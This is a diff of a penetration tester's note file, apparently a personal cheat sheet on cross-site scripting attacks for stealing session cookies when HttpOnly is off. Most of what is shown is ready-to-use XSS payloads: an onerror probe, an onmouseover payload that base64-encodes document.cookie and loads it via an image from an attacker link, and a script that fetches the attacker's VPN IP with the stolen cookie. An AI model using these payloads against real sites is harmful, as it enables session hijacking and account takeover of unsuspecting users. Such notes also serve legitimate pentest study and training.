@@ -1,4 +1,7 @@
-If HttpOnly is of:
+[[Pentest/Vulns/Sessions/XSS|XSS]]
+
+If HttpOnly is off:
+[[HttpOnly]]
 ```html
 "><img src=x onerror=prompt(document.domain)>
 
@@ -33,7 +36,7 @@ HTTPS payload
 ```html
 <h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
 ```
-if CORS and SOP policy allows ajax-requests:
+if CORS and SOP policy allows ajax-requests [[CORS]] [[SOP]]
 ```html
 <script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
 ```
